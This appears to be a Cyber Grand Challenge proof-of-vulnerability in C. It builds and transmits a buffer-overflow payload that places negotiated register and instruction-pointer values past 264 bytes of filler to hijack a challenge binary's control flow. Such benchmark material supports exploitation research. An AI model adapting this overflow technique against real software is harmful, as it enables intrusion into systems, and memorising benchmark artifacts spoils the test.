#include "libpov.h"

int main(int cgc_argc, char *cgc_argv[])
{
    unsigned char *payload = NULL, *buf;
    unsigned int payload_len = 0;
    cgc_size_t bytes;

    cgc_negotiate_type1(0xfefefefe, 0xfefefefe, 3);

    payload = cgc_append_buf(payload, &payload_len, (unsigned char *)"\x00\x00\x80\x0c\x06\x67\xff\xff\xff\xff", 10);

    buf = cgc_malloc(264);
    cgc_random(buf, 264, &bytes);
    payload = cgc_append_buf(payload, &payload_len, buf, 264);
    cgc_free(buf);

    payload = cgc_append_var("TYPE1_REG", payload, &payload_len);
    payload = cgc_append_var("TYPE1_IP", payload, &payload_len);

    buf = cgc_malloc(0x8000);
    cgc_random(buf, 0x8000, &bytes);
    payload = cgc_append_buf(payload, &payload_len, buf, 0x8000 - 264 - 8 + 6);
    cgc_free(buf);

    cgc_transmit_all(1, payload, payload_len);
    cgc_free(payload);
}
